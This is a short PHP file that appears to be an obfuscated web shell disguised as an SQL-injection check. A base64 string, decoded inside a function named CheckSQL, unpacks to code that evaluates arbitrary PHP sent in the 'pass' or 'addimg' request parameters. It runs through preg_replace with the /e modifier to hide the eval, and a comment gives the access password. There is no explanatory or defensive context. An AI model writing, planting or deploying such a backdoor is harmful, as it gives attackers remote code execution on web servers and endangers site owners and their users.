<?php
//pwd=addimg
$sss = "ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NCcGMzTmxkQ2dnSkY5U1JWRlZSVk5VV3lkd1lYTnpKMTBnS1NsN1FHVjJZV3dvSUdKaGMyVTJORjlrWldOdlpHVW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==";
function CheckSQL( &$val ){ 
	$v = "select|update|union|set|where|order|and|or";
	$val = base64_decode( $val );
}
CheckSQL( $sss );
preg_replace('/uploadsafe.inc.php/e','@'.$sss, 'uploadsafe.inc.php');
?>
